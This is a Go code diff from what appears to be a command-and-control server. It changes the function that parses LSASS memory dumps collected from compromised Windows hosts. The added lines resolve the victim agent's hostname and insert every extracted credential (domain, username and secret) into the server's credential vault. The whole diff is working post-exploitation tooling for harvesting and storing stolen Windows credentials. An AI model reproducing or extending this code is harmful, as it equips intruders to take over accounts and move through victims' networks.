@@ -591,6 +591,16 @@ func (s *Server) parseLSASSDump(agentID string, taskID int64, dumpPath, filename
 	parsed := sb.String()
 	s.printf("[LSASS] %d credenciales de %s\n", len(creds), filename)
 
+	// Resolve hostname for vault source tag
+	var hostname string
+	s.db.db.QueryRow(`SELECT hostname FROM agents WHERE id = ?`, agentID).Scan(&hostname)
+	source := "lsass:" + filename
+
+	// Import credentials directly — autoParseCredentials won't recognize our output format
+	for _, c := range creds {
+		s.db.AddCred(c.credType, c.domain, c.username, c.secret, hostname, source, "auto") //nolint:errcheck
+	}
+
 	if taskID > 0 {
 		_ = s.db.InsertResult(taskID, agentID, parsed, "")
 		BroadcastGUI("CREDS_UPDATED", agentID, fmt.Sprintf("%d creds from %s", len(creds), filename))
